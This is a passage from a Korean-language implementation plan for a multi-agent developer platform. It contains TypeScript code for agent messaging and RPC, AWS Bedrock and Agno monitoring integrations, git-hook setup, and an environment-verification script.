      const message = JSON.parse(data) as AgentMessage;
      const channelHandlers = this.handlers.get(channel);
      
      if (channelHandlers) {
        channelHandlers.forEach(handler => handler(message));
      }
    });
  }
  
  async publish(channel: string, message: AgentMessage): Promise<void> {
    await this.publisher.publish(channel, JSON.stringify(message));
  }
  
  subscribe(channel: string, handler: (message: AgentMessage) => void): void {
    if (!this.handlers.has(channel)) {
      this.handlers.set(channel, new Set());
      this.subscriber.subscribe(channel);
    }
    
    this.handlers.get(channel)!.add(handler);
  }
  
  unsubscribe(channel: string): void {
    this.handlers.delete(channel);
    this.subscriber.unsubscribe(channel);
  }
}

// 에이전트 통신 매니저
export class AgentCommunicationManager {
  private messageBus: MessageBus;
  private agents: Map<string, any> = new Map();
  private routingTable: Map<string, string[]> = new Map();
  
  constructor(messageBus: MessageBus) {
    this.messageBus = messageBus;
  }
  
  // 에이전트 등록
  registerAgent(agentId: string, agent: any, channels: string[]): void {
    this.agents.set(agentId, agent);
    
    channels.forEach(channel => {
      if (!this.routingTable.has(channel)) {
        this.routingTable.set(channel, []);
      }
      this.routingTable.get(channel)!.push(agentId);
      
      // 채널 구독
      this.messageBus.subscribe(channel, async (message) => {
        if (message.target === agentId || message.target === 'broadcast') {
          const response = await agent.handleMessage(message);
          
          if (response && response.type === 'response') {
            await this.sendMessage(response);
          }
        }
      });
    });
  }
  
  // 메시지 전송
  async sendMessage(message: AgentMessage): Promise<void> {
    // Direct 메시징
    if (message.target && message.target !== 'broadcast') {
      await this.messageBus.publish(`agent:${message.target}`, message);
      return;
    }
    
    // Broadcast 메시징
    if (message.target === 'broadcast') {
      await this.messageBus.publish('agent:broadcast', message);
    }
  }
  
  // 라우팅 정보 조회
  getRoutingInfo(): Map<string, string[]> {
    return new Map(this.routingTable);
  }
  
  // 에이전트 상태 조회
  getAgentStatus(agentId: string): any {
    const agent = this.agents.get(agentId);
    return agent ? agent.getStatus() : null;
  }
}

// 에이전트 간 RPC 지원
export class AgentRPC {
  private communicationManager: AgentCommunicationManager;
  private pendingCalls: Map<string, {
    resolve: (value: any) => void;
    reject: (error: any) => void;
    timeout: NodeJS.Timeout;
  }> = new Map();
  
  constructor(communicationManager: AgentCommunicationManager) {
    this.communicationManager = communicationManager;
  }
  
  // RPC 호출
  async call(
    targetAgent: string,
    method: string,
    params: any,
    timeout: number = 30000
  ): Promise<any> {
    const callId = `rpc-${Date.now()}-${Math.random()}`;
    
    const message: AgentMessage = {
      id: callId,
      type: 'request',
      source: 'rpc-client',
      target: targetAgent,
      payload: {
        method,
        params
      },
      timestamp: new Date()
    };
    
    return new Promise((resolve, reject) => {
      // 타임아웃 설정
      const timeoutHandle = setTimeout(() => {
        this.pendingCalls.delete(callId);
        reject(new Error(`RPC call timeout: ${method}`));
      }, timeout);
      
      // 대기 중인 호출 등록
      this.pendingCalls.set(callId, {
        resolve,
        reject,
        timeout: timeoutHandle
      });
      
      // 메시지 전송
      this.communicationManager.sendMessage(message);
    });
  }
  
  // RPC 응답 처리
  handleResponse(message: AgentMessage): void {
    if (message.correlationId && this.pendingCalls.has(message.correlationId)) {
      const call = this.pendingCalls.get(message.correlationId)!;
      clearTimeout(call.timeout);
      
      if (message.type === 'response') {
        call.resolve(message.payload);
      } else if (message.type === 'error') {
        call.reject(new Error(message.payload.error));
      }
      
      this.pendingCalls.delete(message.correlationId);
    }
  }
}
```

### SubTask 0.13.3: AWS Bedrock AgentCore 통합 준비
**목표**: Bedrock AgentCore와의 통합을 위한 기초 설정

**구현 내용**:
```typescript
// backend/src/integrations/bedrock/agentcore-config.ts
import { 
  BedrockAgentRuntimeClient,
  InvokeAgentCommand,
  RetrieveCommand
} from '@aws-sdk/client-bedrock-agent-runtime';
import { Logger } from 'winston';

export interface AgentCoreConfig {
  agentId: string;
  agentAliasId: string;
  region: string;
  knowledgeBaseId?: string;
  instructionTemplate?: string;
}

export class BedrockAgentCoreManager {
  private client: BedrockAgentRuntimeClient;
  private logger: Logger;
  private config: AgentCoreConfig;
  
  constructor(
    config: AgentCoreConfig,
    logger: Logger
  ) {
    this.config = config;
    this.logger = logger;
    
    this.client = new BedrockAgentRuntimeClient({
      region: config.region
    });
  }
  
  // 에이전트 호출
  async invokeAgent(
    sessionId: string,
    inputText: string,
    sessionAttributes?: Record<string, string>
  ): Promise<any> {
    try {
      const command = new InvokeAgentCommand({
        agentId: this.config.agentId,
        agentAliasId: this.config.agentAliasId,
        sessionId,
        inputText,
        sessionState: {
          sessionAttributes
        }
      });
      
      const response = await this.client.send(command);
      
      // 스트리밍 응답 처리
      const chunks: any[] = [];
      
      if (response.completion) {
        for await (const chunk of response.completion) {
          chunks.push(chunk);
          
          // 청크 타입별 처리
          if (chunk.chunk) {
            this.handleChunk(chunk.chunk);
          }
        }
      }
      
      return {
        sessionId,
        response: chunks,
        metadata: {
          agentId: this.config.agentId,
          timestamp: new Date()
        }
      };
      
    } catch (error) {
      this.logger.error('Bedrock AgentCore invocation failed', {
        error,
        sessionId,
        inputText
      });
      throw error;
    }
  }
  
  // Knowledge Base 검색
  async retrieveFromKnowledgeBase(
    query: string,
    numberOfResults: number = 5
  ): Promise<any> {
    if (!this.config.knowledgeBaseId) {
      throw new Error('Knowledge base ID not configured');
    }
    
    try {
      const command = new RetrieveCommand({
        knowledgeBaseId: this.config.knowledgeBaseId,
        retrievalQuery: {
          text: query
        },
        retrievalConfiguration: {
          vectorSearchConfiguration: {
            numberOfResults
          }
        }
      });
      
      const response = await this.client.send(command);
      
      return {
        results: response.retrievalResults || [],
        metadata: {
          knowledgeBaseId: this.config.knowledgeBaseId,
          query,
          timestamp: new Date()
        }
      };
      
    } catch (error) {
      this.logger.error('Knowledge base retrieval failed', {
        error,
        query,
        knowledgeBaseId: this.config.knowledgeBaseId
      });
      throw error;
    }
  }
  
  // 청크 처리
  private handleChunk(chunk: any): void {
    if (chunk.bytes) {
      // 바이너리 데이터 처리
      const text = Buffer.from(chunk.bytes).toString('utf-8');
      this.logger.debug('Received text chunk', { text });
    }
    
    if (chunk.attribution) {
      // 속성 정보 처리
      this.logger.debug('Received attribution', {
        attribution: chunk.attribution
      });
    }
  }
  
  // 세션 관리
  async createSession(userId: string, metadata?: any): Promise<string> {
    const sessionId = `${userId}-${Date.now()}`;
    
    this.logger.info('Created Bedrock session', {
      sessionId,
      userId,
      metadata
    });
    
    return sessionId;
  }
}

// Bedrock 에이전트 래퍼
export abstract class BedrockAgent extends BaseAgent {
  protected bedrockManager: BedrockAgentCoreManager;
  
  constructor(
    name: string,
    version: string,
    logger: Logger,
    bedrockConfig: AgentCoreConfig
  ) {
    super(name, version, logger);
    
    this.bedrockManager = new BedrockAgentCoreManager(
      bedrockConfig,
      logger
    );
  }
  
  // Bedrock 기능을 활용한 처리
  protected async processWithBedrock(
    input: string,
    sessionId?: string
  ): Promise<any> {
    const session = sessionId || await this.bedrockManager.createSession(
      this.context?.userId || 'anonymous'
    );
    
    return this.bedrockManager.invokeAgent(session, input);
  }
  
  // Knowledge Base 활용
  protected async searchKnowledgeBase(query: string): Promise<any> {
    return this.bedrockManager.retrieveFromKnowledgeBase(query);
  }
}
```

### SubTask 0.13.4: Agent Squad 통합 준비
**목표**: AWS Agent Squad와의 통합을 위한 기초 설정

**구현 내용**:
```typescript
// backend/src/integrations/agent-squad/squad-config.ts
import { EventEmitter } from 'events';
import { Logger } from 'winston';

export interface SquadConfig {
  supervisorConfig: {
    name: string;
    role: 'orchestrator' | 'coordinator' | 'monitor';
    capabilities: string[];
  };
  workers: Array<{
    name: string;
    type: string;
    count: number;
    capabilities: string[];
  }>;
  communication: {
    protocol: 'redis' | 'sqs' | 'eventbridge';
    endpoint: string;
  };
}

// Supervisor Agent 구현
export class SupervisorAgent extends EventEmitter {
  private config: SquadConfig['supervisorConfig'];
  private logger: Logger;
  private workers: Map<string, WorkerAgent[]> = new Map();
  private taskQueue: TaskQueue;
  
  constructor(
    config: SquadConfig['supervisorConfig'],
    logger: Logger
  ) {
    super();
    this.config = config;
    this.logger = logger;
    this.taskQueue = new TaskQueue();
    
    this.initialize();
  }
  
  private initialize(): void {
    this.logger.info('Supervisor Agent initialized', {
      name: this.config.name,
      role: this.config.role,
      capabilities: this.config.capabilities
    });
  }
  
  // Worker 관리
  async addWorker(worker: WorkerAgent): Promise<void> {
    const type = worker.getType();
    
    if (!this.workers.has(type)) {
      this.workers.set(type, []);
    }
    
    this.workers.get(type)!.push(worker);
    
    this.logger.info('Worker added to squad', {
      supervisorName: this.config.name,
      workerType: type,
      workerId: worker.getId()
    });
    
    // Worker 이벤트 구독
    worker.on('taskCompleted', (result) => {
      this.handleWorkerTaskCompletion(worker, result);
    });
    
    worker.on('error', (error) => {
      this.handleWorkerError(worker, error);
    });
  }
  
  // 작업 분배
  async distributeTask(task: Task): Promise<void> {
    const workerType = this.selectWorkerType(task);
    const workers = this.workers.get(workerType);
    
    if (!workers || workers.length === 0) {
      throw new Error(`No workers available for type: ${workerType}`);
    }
    
    // 로드 밸런싱: 가장 idle한 worker 선택
    const selectedWorker = this.selectIdleWorker(workers);
    
    if (!selectedWorker) {
      // 모든 worker가 busy하면 큐에 추가
      await this.taskQueue.enqueue(task);
      return;
    }
    
    await selectedWorker.executeTask(task);
  }
  
  // Worker 선택 로직
  private selectWorkerType(task: Task): string {
    // 작업 타입과 capability 매칭
    for (const [type, workers] of this.workers) {
      if (workers.some(w => w.canHandle(task))) {
        return type;
      }
    }
    
    throw new Error(`No suitable worker for task: ${task.type}`);
  }
  
  private selectIdleWorker(workers: WorkerAgent[]): WorkerAgent | null {
    return workers.find(w => w.getStatus() === 'idle') || null;
  }
  
  // 이벤트 핸들러
  private handleWorkerTaskCompletion(
    worker: WorkerAgent,
    result: any
  ): void {
    this.logger.info('Worker task completed', {
      workerId: worker.getId(),
      result
    });
    
    this.emit('taskCompleted', {
      worker: worker.getId(),
      result
    });
    
    // 큐에서 다음 작업 할당
    this.assignNextTask(worker);
  }
  
  private handleWorkerError(
    worker: WorkerAgent,
    error: Error
  ): void {
    this.logger.error('Worker error', {
      workerId: worker.getId(),
      error
    });
    
    this.emit('workerError', {
      worker: worker.getId(),
      error
    });
  }
  
  private async assignNextTask(worker: WorkerAgent): Promise<void> {
    const nextTask = await this.taskQueue.dequeue(worker.getType());
    
    if (nextTask) {
      await worker.executeTask(nextTask);
    }
  }
  
  // 상태 모니터링
  getSquadStatus(): any {
    const status = {
      supervisor: {
        name: this.config.name,
        role: this.config.role
      },
      workers: {} as any,
      queueSize: this.taskQueue.size()
    };
    
    for (const [type, workers] of this.workers) {
      status.workers[type] = {
        count: workers.length,
        idle: workers.filter(w => w.getStatus() === 'idle').length,
        busy: workers.filter(w => w.getStatus() === 'busy').length
      };
    }
    
    return status;
  }
}

// Worker Agent 기본 클래스
export abstract class WorkerAgent extends EventEmitter {
  protected id: string;
  protected type: string;
  protected status: 'idle' | 'busy' | 'error' = 'idle';
  protected capabilities: string[];
  protected logger: Logger;
  
  constructor(
    type: string,
    capabilities: string[],
    logger: Logger
  ) {
    super();
    this.id = `worker-${type}-${Date.now()}`;
    this.type = type;
    this.capabilities = capabilities;
    this.logger = logger;
  }
  
  getId(): string {
    return this.id;
  }
  
  getType(): string {
    return this.type;
  }
  
  getStatus(): string {
    return this.status;
  }
  
  canHandle(task: Task): boolean {
    return this.capabilities.includes(task.capability);
  }
  
  async executeTask(task: Task): Promise<void> {
    this.status = 'busy';
    
    try {
      const result = await this.process(task);
      
      this.emit('taskCompleted', result);
      this.status = 'idle';
      
    } catch (error) {
      this.status = 'error';
      this.emit('error', error);
      
      setTimeout(() => {
        this.status = 'idle';
      }, 5000); // 5초 후 복구
    }
  }
  
  protected abstract process(task: Task): Promise<any>;
}

// 작업 큐 구현
class TaskQueue {
  private queues: Map<string, Task[]> = new Map();
  
  async enqueue(task: Task): Promise<void> {
    const type = task.workerType || 'default';
    
    if (!this.queues.has(type)) {
      this.queues.set(type, []);
    }
    
    this.queues.get(type)!.push(task);
  }
  
  async dequeue(type: string): Promise<Task | null> {
    const queue = this.queues.get(type);
    
    if (!queue || queue.length === 0) {
      return null;
    }
    
    return queue.shift() || null;
  }
  
  size(): number {
    let total = 0;
    for (const queue of this.queues.values()) {
      total += queue.length;
    }
    return total;
  }
}

// 타입 정의
interface Task {
  id: string;
  type: string;
  capability: string;
  workerType?: string;
  payload: any;
  priority?: number;
  timeout?: number;
}
```

### SubTask 0.13.5: Agno 모니터링 통합 준비
**목표**: Agno 플랫폼과의 모니터링 통합 설정

**구현 내용**:
```typescript
// backend/src/integrations/agno/monitoring-config.ts
import axios, { AxiosInstance } from 'axios';
import { Logger } from 'winston';

export interface AgnoConfig {
  apiKey: string;
  endpoint: string;
  projectId: string;
  environment: string;
  batchSize?: number;
  flushInterval?: number;
}

export interface AgnoMetric {
  name: string;
  value: number;
  tags?: Record<string, string>;
  timestamp?: Date;
}

export interface AgnoEvent {
  type: string;
  data: any;
  userId?: string;
  sessionId?: string;
  timestamp?: Date;
  metadata?: Record<string, any>;
}

export interface AgnoTrace {
  traceId: string;
  spanId: string;
  parentSpanId?: string;
  operation: string;
  startTime: Date;
  endTime?: Date;
  duration?: number;
  status: 'success' | 'error';
  metadata?: Record<string, any>;
}

export class AgnoMonitoringClient {
  private config: AgnoConfig;
  private client: AxiosInstance;
  private logger: Logger;
  private metricBuffer: AgnoMetric[] = [];
  private eventBuffer: AgnoEvent[] = [];
  private traceBuffer: AgnoTrace[] = [];
  private flushTimer?: NodeJS.Timer;
  
  constructor(config: AgnoConfig, logger: Logger) {
    this.config = {
      batchSize: 100,
      flushInterval: 10000, // 10초
      ...config
    };
    this.logger = logger;
    
    this.client = axios.create({
      baseURL: config.endpoint,
      headers: {
        'Authorization': `Bearer ${config.apiKey}`,
        'Content-Type': 'application/json',
        'X-Project-ID': config.projectId,
        'X-Environment': config.environment
      }
    });
    
    this.startFlushTimer();
  }
  
  // 메트릭 전송
  async sendMetric(metric: AgnoMetric): Promise<void> {
    this.metricBuffer.push({
      ...metric,
      timestamp: metric.timestamp || new Date()
    });
    
    if (this.metricBuffer.length >= this.config.batchSize!) {
      await this.flushMetrics();
    }
  }
  
  // 이벤트 전송
  async sendEvent(event: AgnoEvent): Promise<void> {
    this.eventBuffer.push({
      ...event,
      timestamp: event.timestamp || new Date()
    });
    
    if (this.eventBuffer.length >= this.config.batchSize!) {
      await this.flushEvents();
    }
  }
  
  // 트레이스 전송
  async sendTrace(trace: AgnoTrace): Promise<void> {
    this.traceBuffer.push(trace);
    
    if (this.traceBuffer.length >= this.config.batchSize!) {
      await this.flushTraces();
    }
  }
  
  // 에이전트 성능 모니터링
  async monitorAgentPerformance(
    agentName: string,
    operation: string,
    duration: number,
    success: boolean,
    metadata?: any
  ): Promise<void> {
    // 메트릭 전송
    await this.sendMetric({
      name: `agent.${agentName}.duration`,
      value: duration,
      tags: {
        agent: agentName,
        operation,
        status: success ? 'success' : 'failure'
      }
    });
    
    // 이벤트 전송
    await this.sendEvent({
      type: 'agent_operation',
      data: {
        agent: agentName,
        operation,
        duration,
        success,
        ...metadata
      }
    });
  }
  
  // 프로젝트 진행상황 모니터링
  async monitorProjectProgress(
    projectId: string,
    phase: string,
    progress: number,
    metadata?: any
  ): Promise<void> {
    await this.sendEvent({
      type: 'project_progress',
      data: {
        projectId,
        phase,
        progress,
        ...metadata
      }
    });
    
    await this.sendMetric({
      name: 'project.progress',
      value: progress,
      tags: {
        project: projectId,
        phase
      }
    });
  }
  
  // 에러 추적
  async trackError(
    error: Error,
    context: {
      agent?: string;
      operation?: string;
      userId?: string;
      projectId?: string;
    }
  ): Promise<void> {
    await this.sendEvent({
      type: 'error',
      data: {
        message: error.message,
        stack: error.stack,
        name: error.name,
        ...context
      },
      userId: context.userId
    });
  }
  
  // 배치 전송 메서드들
  private async flushMetrics(): Promise<void> {
    if (this.metricBuffer.length === 0) return;
    
    const metrics = [...this.metricBuffer];
    this.metricBuffer = [];
    
    try {
      await this.client.post('/metrics', { metrics });
      this.logger.debug(`Flushed ${metrics.length} metrics to Agno`);
    } catch (error) {
      this.logger.error('Failed to flush metrics to Agno', { error });
      // 실패한 메트릭은 버퍼에 다시 추가
      this.metricBuffer.unshift(...metrics);
    }
  }
  
  private async flushEvents(): Promise<void> {
    if (this.eventBuffer.length === 0) return;
    
    const events = [...this.eventBuffer];
    this.eventBuffer = [];
    
    try {
      await this.client.post('/events', { events });
      this.logger.debug(`Flushed ${events.length} events to Agno`);
    } catch (error) {
      this.logger.error('Failed to flush events to Agno', { error });
      this.eventBuffer.unshift(...events);
    }
  }
  
  private async flushTraces(): Promise<void> {
    if (this.traceBuffer.length === 0) return;
    
    const traces = [...this.traceBuffer];
    this.traceBuffer = [];
    
    try {
      await this.client.post('/traces', { traces });
      this.logger.debug(`Flushed ${traces.length} traces to Agno`);
    } catch (error) {
      this.logger.error('Failed to flush traces to Agno', { error });
      this.traceBuffer.unshift(...traces);
    }
  }
  
  // 타이머 관리
  private startFlushTimer(): void {
    this.flushTimer = setInterval(async () => {
      await Promise.all([
        this.flushMetrics(),
        this.flushEvents(),
        this.flushTraces()
      ]);
    }, this.config.flushInterval!);
  }
  
  async shutdown(): Promise<void> {
    if (this.flushTimer) {
      clearInterval(this.flushTimer);
    }
    
    // 남은 데이터 모두 전송
    await Promise.all([
      this.flushMetrics(),
      this.flushEvents(),
      this.flushTraces()
    ]);
  }
}

// Agno 데코레이터 (메서드 자동 추적)
export function AgnoTrace(
  operationName?: string
): MethodDecorator {
  return function (
    target: any,
    propertyKey: string | symbol,
    descriptor: PropertyDescriptor
  ) {
    const originalMethod = descriptor.value;
    
    descriptor.value = async function (...args: any[]) {
      const operation = operationName || String(propertyKey);
      const traceId = `trace-${Date.now()}-${Math.random()}`;
      const spanId = `span-${Date.now()}-${Math.random()}`;
      const startTime = Date.now();
      
      const agnoClient = (this as any).agnoClient;
      
      try {
        const result = await originalMethod.apply(this, args);
        
        if (agnoClient) {
          await agnoClient.sendTrace({
            traceId,
            spanId,
            operation,
            startTime: new Date(startTime),
            endTime: new Date(),
            duration: Date.now() - startTime,
            status: 'success',
            metadata: {
              class: target.constructor.name,
              method: String(propertyKey)
            }
          });
        }
        
        return result;
        
      } catch (error) {
        if (agnoClient) {
          await agnoClient.sendTrace({
            traceId,
            spanId,
            operation,
            startTime: new Date(startTime),
            endTime: new Date(),
            duration: Date.now() - startTime,
            status: 'error',
            metadata: {
              class: target.constructor.name,
              method: String(propertyKey),
              error: error.message
            }
          });
        }
        
        throw error;
      }
    };
    
    return descriptor;
  };
}
```

---

## Task 0.14: 개발 워크플로우 자동화

### SubTask 0.14.1: Git 훅 및 커밋 규칙 설정
**목표**: 일관된 코드 품질을 위한 Git 훅 설정

**구현 내용**:
```bash
#!/bin/bash
# scripts/setup-git-hooks.sh

echo "🔧 Git 훅 설정 시작..."

# Husky 설치 및 초기화
npm install --save-dev husky
npx husky install

# commit-msg 훅 추가
npx husky add .husky/commit-msg 'npx --no -- commitlint --edit $1'

# pre-commit 훅 추가
npx husky add .husky/pre-commit 'npm run pre-commit'

# pre-push 훅 추가
npx husky add .husky/pre-push 'npm run pre-push'

echo "✅ Git 훅 설정 완료!"
```

```typescript
// commitlint.config.js
module.exports = {
  extends: ['@commitlint/config-conventional'],
  rules: {
    'type-enum': [
      2,
      'always',
      [
        'feat',     // 새로운 기능
        'fix',      // 버그 수정
        'docs',     // 문서 수정
        'style',    // 코드 포맷팅
        'refactor', // 코드 리팩토링
        'test',     // 테스트 추가/수정
        'chore',    // 빌드 프로세스 또는 보조 도구 변경
        'perf',     // 성능 개선
        'ci',       // CI 설정 변경
        'revert',   // 이전 커밋 되돌리기
        'agent'     // 에이전트 관련 변경 (T-Developer 전용)
      ]
    ],
    'subject-case': [2, 'never', ['upper-case']],
    'header-max-length': [2, 'always', 72],
    'body-max-line-length': [2, 'always', 100],
    'scope-enum': [
      2,
      'always',
      [
        'core',
        'agents',
        'api',
        'frontend',
        'infra',
        'docs',
        'tests',
        'deps'
      ]
    ]
  }
};
```

```json
// .gitmessage
# <type>(<scope>): <subject>
#
# <body>
#
# <footer>
#
# Type: feat, fix, docs, style, refactor, test, chore, perf, ci, revert, agent
# Scope: core, agents, api, frontend, infra, docs, tests, deps
#
# Subject: 첫 글자 소문자, 명령형, 마침표 없음, 50자 이내
#
# Body: 72자마다 줄바꿈, 무엇을 왜 했는지 설명
#
# Footer: Breaking changes, 이슈 번호 참조
#
# 예시:
# feat(agents): add natural language input processing
#
# Implement NL input agent with following capabilities:
# - Parse user requirements from natural language
# - Extract technical specifications
# - Generate structured project metadata
#
# Closes #123
```
### SubTask 0.14.2: 개발 환경 최종 검증
**목표**: 모든 개발 환경 구성요소의 정상 작동 확인

**구현 내용**:
```typescript
// scripts/verify-environment.ts
import { exec } from 'child_process';
import { promisify } from 'util';
import fs from 'fs/promises';
import axios from 'axios';
import { DynamoDBClient, ListTablesCommand } from '@aws-sdk/client-dynamodb';
import Redis from 'ioredis';
import chalk from 'chalk';

const execAsync = promisify(exec);

interface VerificationResult {
  component: string;
  status: 'pass' | 'fail' | 'warning';
  message: string;
  details?: any;
}

class EnvironmentVerifier {
  private results: VerificationResult[] = [];
  
  async verify(): Promise<void> {
    console.log(chalk.blue('🔍 T-Developer 환경 검증 시작...\n'));
    
    // 1. Node.js 환경
    await this.verifyNodeEnvironment();
    
    // 2. AWS 설정
    await this.verifyAWSConfiguration();
    
    // 3. 데이터베이스
    await this.verifyDatabases();
    
    // 4. 외부 서비스
    await this.verifyExternalServices();
    
    // 5. 개발 도구
    await this.verifyDevelopmentTools();
    
    // 6. 보안 설정
    await this.verifySecuritySettings();
    
    // 결과 출력
    this.printResults();
  }
  
  private async verifyNodeEnvironment(): Promise<void> {
    try {
      const { stdout: nodeVersion } = await execAsync('node --version');
      const { stdout: npmVersion } = await execAsync('npm --version');
      
      const nodeMatch = nodeVersion.match(/v(\d+)\.(\d+)/);
      if (nodeMatch) {
        const majorVersion = parseInt(nodeMatch[1]);
        if (majorVersion >= 18) {
          this.addResult('Node.js', 'pass', `버전 ${nodeVersion.trim()} 확인`);
        } else {
          this.addResult('Node.js', 'fail', `버전 18 이상 필요 (현재: ${nodeVersion.trim()})`);
        }
      }
      
      this.addResult('npm', 'pass', `버전 ${npmVersion.trim()} 확인`);
      
      // 필수 패키지 확인
      const packageJson = JSON.parse(await fs.readFile('package.json', 'utf-8'));
      const requiredPackages = [
        '@aws-sdk/client-bedrock-runtime',
        '@aws-sdk/client-dynamodb',
        'express',
        'typescript',
        'jest'
      ];
      
      const missingPackages = requiredPackages.filter(
        pkg => !packageJson.dependencies?.[pkg] && !packageJson.devDependencies?.[pkg]
      );
      
      if (missingPackages.length === 0) {
        this.addResult('필수 패키지', 'pass', '모든 필수 패키지 설치됨');
      } else {
        this.addResult('필수 패키지', 'fail', `누락된 패키지: ${missingPackages.join(', ')}`);
      }
      
    } catch (error) {
      this.addResult('Node.js 환경', 'fail', '확인 실패', error);
    }
  }
  
  private async verifyAWSConfiguration(): Promise<void> {
    try {
      // AWS 자격 증명 확인
      const { stdout: awsIdentity } = await execAsync('aws sts get-caller-identity');
      const identity = JSON.parse(awsIdentity);
      
      this.addResult('AWS 자격 증명', 'pass', `계정 ID: ${identity.Account}`);
      
      // DynamoDB 연결 테스트
      const dynamoClient = new DynamoDBClient({
        region: process.env.AWS_REGION || 'us-east-1',
        endpoint: process.env.DYNAMODB_ENDPOINT
      });
      
      const tables = await dynamoClient.send(new ListTablesCommand({}));
      this.addResult('DynamoDB', 'pass', `테이블 수: ${tables.TableNames?.length || 0}`);
      
      // S3 버킷 확인
      const { stdout: s3Buckets } = await execAsync('aws s3 ls');
      const bucketCount = s3Buckets.split('\n').filter(line => line.trim()).length;
      this.addResult('S3', 'pass', `버킷 수: ${bucketCount}`);
      
    } catch (error) {
      this.addResult('AWS 설정', 'fail', 'AWS 서비스 연결 실패', error);
    }
  }
  
  private async verifyDatabases(): Promise<void> {
    // Redis 연결 테스트
    try {
      const redis = new Redis({
        host: process.env.REDIS_HOST || 'localhost',
        port: parseInt(process.env.REDIS_PORT || '6379'),
        retryStrategy: () => null
      });
      
      await redis.ping();
      this.addResult('Redis', 'pass', 'Redis 서버 연결 성공');
      await redis.disconnect();
      
    } catch (error) {
      this.addResult('Redis', 'warning', 'Redis 서버 연결 실패 (선택사항)');
    }
    
    // DynamoDB Local 확인
    if (process.env.NODE_ENV === 'development') {
      try {
        const response = await axios.get('http://localhost:8000');
        this.addResult('DynamoDB Local', 'pass', '로컬 DynamoDB 실행 중');
      } catch {
        this.addResult('DynamoDB Local', 'warning', '로컬 DynamoDB 미실행 (개발용)');
      }
    }
  }
  
  private async verifyExternalServices(): Promise<void> {
    // GitHub API
    if (process.env.GITHUB_TOKEN) {
      try {
        await axios.get('https://api.github.com/user', {
          headers: { Authorization: `token ${process.env.GITHUB_TOKEN}` }
        });
        this.addResult('GitHub API', 'pass', 'GitHub 토큰 유효');
      } catch {
        this.addResult('GitHub API', 'fail', 'GitHub 토큰 무효');
      }
    } else {
      this.addResult('GitHub API', 'warning', 'GitHub 토큰 미설정');
    }
    
    // AI 서비스
    const aiServices = [
      { name: 'OpenAI', envVar: 'OPENAI_API_KEY' },
      { name: 'Anthropic', envVar: 'ANTHROPIC_API_KEY' },
      { name: 'Bedrock', envVar: 'BEDROCK_AGENTCORE_RUNTIME_ID' }
    ];
    
    for (const service of aiServices) {
      if (process.env[service.envVar]) {
        this.addResult(service.name, 'pass', `${service.envVar} 설정됨`);
      } else {
        this.addResult(service.name, 'warning', `${service.envVar} 미설정`);
      }
    }
  }
  
  private async verifyDevelopmentTools(): Promise<void> {
    const tools = [
      { cmd: 'docker --version', name: 'Docker' },
      { cmd: 'git --version', name: 'Git' },
      { cmd: 'code --version', name: 'VS Code', optional: true }
    ];
    
    for (const tool of tools) {
      try {
        const { stdout } = await execAsync(tool.cmd);
        this.addResult(tool.name, 'pass', stdout.trim().split('\n')[0]);
      } catch {
        if (tool.optional) {
          this.addResult(tool.name, 'warning', '설치되지 않음 (선택사항)');
        } else {
          this.addResult(tool.name, 'fail', '설치되지 않음');
        }
      }
    }
  }
  
  private async verifySecuritySettings(): Promise<void> {
    // 환경 변수 보안
    const sensitiveVars = ['JWT_SECRET', 'ENCRYPTION_KEY'];
    const weakValues = ['secret', 'password', '123456', 'admin'];
    
    for (const varName of sensitiveVars) {
      const value = process.env[varName];
      if (!value) {
        this.addResult(`보안: ${varName}`, 'fail', '설정되지 않음');
      } else if (weakValues.includes(value.toLowerCase())) {
        this.addResult(`보안: ${varName}`, 'fail', '약한 값 사용');
      } else if (value.length < 16) {
        this.addResult(`보안: ${varName}`, 'warning', '16자 이상 권장');
      } else {
        this.addResult(`보안: ${varName}`, 'pass', '적절한 값 설정됨');
      }
    }
    
    // .env 파일 권한 확인
    try {
      const stats = await fs.stat('.env');
      const mode = (stats.mode & parseInt('777', 8)).toString(8);
      if (mode === '600') {
        this.addResult('.env 파일 권한', 'pass', '안전한 권한 설정 (600)');
      } else {
        this.addResult('.env 파일 권한', 'warning', `현재 권한: ${mode} (600 권장)`);
      }
    } catch {
      this.addResult('.env 파일', 'fail', '.env 파일이 없습니다');
    }
  }
  
  private addResult(component: string, status: VerificationResult['status'], message: string, details?: any): void {
    this.results.push({ component, status, message, details });
  }
  
  private printResults(): void {
    console.log('\n' + chalk.blue('='.repeat(60)));
    console.log(chalk.blue.bold('검증 결과 요약'));
    console.log(chalk.blue('='.repeat(60)) + '\n');
    
    const statusIcons = {
      pass: chalk.green('✅'),
      fail: chalk.red('❌'),
      warning: chalk.yellow('⚠️')
    };
    
    const maxComponentLength = Math.max(...this.results.map(r => r.component.length));
    
    for (const result of this.results) {
      const icon = statusIcons[result.status];
      const component = result.component.padEnd(maxComponentLength + 2);
      const statusColor = result.status === 'pass' ? chalk.green :
                         result.status === 'fail' ? chalk.red : chalk.yellow;
      
      console.log(`${icon} ${chalk.white(component)} ${statusColor(result.message)}`);
      
      if (result.details && process.env.VERBOSE) {
        console.log(chalk.gray(`   상세: ${JSON.stringify(result.details, null, 2)}`));
      }
    }
    
    // 통계
    const stats = {
      pass: this.results.filter(r => r.status === 'pass').length,
      fail: this.results.filter(r => r.status === 'fail').length,
      warning: this.results.filter(r => r.status === 'warning').length
    };
    
    console.log('\n' + chalk.blue('-'.repeat(60)));
    console.log(chalk.white('통계:'), 
      chalk.green(`성공: ${stats.pass}`),
      chalk.red(`실패: ${stats.fail}`),
      chalk.yellow(`경고: ${stats.warning}`)
    );
    
    if (stats.fail > 0) {
      console.log('\n' + chalk.red.bold('⚠️  일부 검증이 실패했습니다. 위의 실패 항목을 확인하세요.'));
      process.exit(1);
    } else if (stats.warning > 0) {
      console.log('\n' + chalk.yellow.bold('ℹ️  일부 경고가 있지만 개발을 시작할 수 있습니다.'));
    } else {
      console.log('\n' + chalk.green.bold('🎉 모든 검증을 통과했습니다! 개발 환경이 준비되었습니다.'));
    }
  }
}

// 실행
if (require.main === module) {
  const verifier = new EnvironmentVerifier();
  verifier.verify().catch(console.error);
}

export { EnvironmentVerifier };
```

### SubTask 0.14.3: 개발 환경 설정 문서화
**목표**: 완성된 개발 환경 설정을 문서로 정리

**구현 내용**:
```markdown
<!-- docs/setup/development-environment.md -->
# T-Developer 개발 환경 설정 가이드

## 📋 목차
1. [시스템 요구사항](#시스템-요구사항)
2. [필수 도구 설치](#필수-도구-설치)
3. [프로젝트 설정](#프로젝트-설정)
4. [환경 변수 구성](#환경-변수-구성)
5. [AWS 서비스 설정](#aws-서비스-설정)
6. [로컬 개발 환경](#로컬-개발-환경)
7. [검증 및 테스트](#검증-및-테스트)
8. [문제 해결](#문제-해결)

